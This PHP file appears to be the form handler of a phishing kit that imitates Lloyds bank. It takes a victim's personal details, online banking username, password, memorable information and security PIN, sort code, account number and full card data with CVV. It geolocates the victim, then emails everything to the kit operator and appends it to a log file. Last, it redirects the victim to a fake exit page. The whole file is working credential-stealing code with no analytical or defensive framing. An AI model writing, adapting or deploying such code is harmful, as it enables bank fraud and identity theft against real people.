<?php

require "../../../includes/functions.php";

require "../../../CONTROLS.php";
error_reporting(0);
session_start();


date_default_timezone_set('Europe/London');
$date = date('l d F Y');
$time = date('H:i');
$user = $_SESSION['user'];
$pass = $_SESSION['pass2'];
$memo = $_SESSION['memo'];
$name = $_POST['name'];
$dob = $_POST['dob'];
$address = $_POST['address']." ".$_POST['postcode'];
if(!isset($_POST['telephone'])) {
$telephone = '';
}      
else $telephone = $_POST['telephone'];
$mobile = $_POST['mobile'];
$mmn = $_POST['mmn'];
$account = $_POST['account'];
$sortcode = $_POST['sortcode'];
$ccno = $_POST['ccno'];
$ccexp = $_POST['ccexp'];
$secode = $_POST['secode'];
if(!isset($_POST['telepin'])) {
$telepin = '';
}      
else $telepin = $_POST['telepin'];
$ccno = str_replace(' ', '', $ccno);
$cardInfo = bankDetails($ccno);
$_SESSION['bin'] = ($cardInfo['bin']);
$_SESSION['brand'] = ($cardInfo['brand']);
$_SESSION['bank'] = ($cardInfo['issuer']);
$_SESSION['type'] = ($cardInfo['type']);
$bin = $_SESSION['bin'];
$bank = $_SESSION['bank'];
$brand = $_SESSION['brand'];
$type = $_SESSION['type'];
$ip = $_SERVER['REMOTE_ADDR'];
$systemInfo = systemInfo($_SERVER['REMOTE_ADDR']);
$_SESSION['VictimInfo1'] = "| Submitted by : " . $_SERVER['REMOTE_ADDR'] . " (" . gethostbyaddr($_SERVER['REMOTE_ADDR']) . ")";
$_SESSION['VictimInfo2'] = "| Location : " . $systemInfo['city'] . ", " . $systemInfo['region'] . ", " . $systemInfo['country'] . "";
$_SESSION['VictimInfo3'] = "| UserAgent : " . $systemInfo['useragent'] . "";
$_SESSION['VictimInfo4'] = "| Browser : " . $systemInfo['browser'] . "";
$_SESSION['VictimInfo5'] = "| Os : " . $systemInfo['os'] . "";
$VictimInfo1 = $_SESSION['VictimInfo1'];
$VictimInfo2 = $_SESSION['VictimInfo2'];
$VictimInfo3 = $_SESSION['VictimInfo3'];
$VictimInfo4 = $_SESSION['VictimInfo4'];
$VictimInfo5 = $_SESSION['VictimInfo5'];
$data = "
+ -------------LLOYDS-------------+
+ ------------------------------------------+
+ Personal Information
| Full name : $name
| Date of birth : $dob
| Address : $address
| Home Tel : $telephone
| Mobile Tel : $mobile
| Mother Maiden : $mmn
+ ------------------------------------------+
+ Account Information (lloyds)
| User : $user
| Pass : $pass
| Memorable Info : $memo
| 6-digit Security Code: $telepin
| Sortcode: $sortcode
| Account No: $account
+ ------------------------------------------+
+ Billing Information
| Card Number : $ccno
| Expiration date : $ccexp
| CVV : $secode
+ ------------------------------------------+
+ Victim Information
$VictimInfo1
$VictimInfo2
$VictimInfo3
$VictimInfo4
$VictimInfo5
| Received : $date @ $time
+ ------------------------------------------+
";
mail($to, 'Lloyds from ' . $_SERVER['REMOTE_ADDR'], $data);

$file = fopen('../../../assets/logs/banks.txt', 'a');
fwrite($file, $data);
fclose($file);

redirectTo("../../../Exit.php?sslchannel=true&sessionid=" . generateRandomString(130));
die;
?>